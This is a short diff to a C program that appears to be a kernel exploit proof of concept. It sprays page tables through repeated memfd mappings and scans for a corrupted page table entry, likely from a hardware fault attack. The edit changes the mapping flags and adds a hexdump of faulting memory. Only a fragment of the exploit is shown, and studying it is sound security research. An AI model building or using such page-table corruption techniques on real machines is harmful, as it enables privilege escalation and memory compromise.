@@ -85,7 +85,7 @@ int main()
 	printf("[*] Spraying pagetables\n");
 	for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
 		uint8_t *map_vaddr = (uint8_t*)SPRAY_BASE + i * MEMFD_SIZE;
-		uint8_t *mmap_res = mmap(map_vaddr, MEMFD_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED_NOREPLACE, memfd, 0);
+		uint8_t *mmap_res = mmap(map_vaddr, MEMFD_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED_NOREPLACE, memfd, 0);
 		assert(mmap_res == map_vaddr);
 	}
 
@@ -109,17 +109,18 @@ int main()
 		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
 			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
 				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
-				foo += *glitched_pte; // read to keep it in cache
+				foo += *glitched_pte; // read to keep it in cache?
 				if (ptr == glitched_pte) continue;
 				if (*ptr != 0x4141414141414141) {
 					printf("FAULT!\n");
 					printf("0x%016lx\n", ptr);
+
+					hexdump(ptr, 4096);
 				}
 			}
 		}
 	}
 
 	printf("[*] PTE value: 0x%016lx\n", *glitched_pte);
-	printf("[*] PTE+8 value: 0x%016lx\n", *(glitched_pte+8));
 	printf("bye %lu\n", foo);
 }
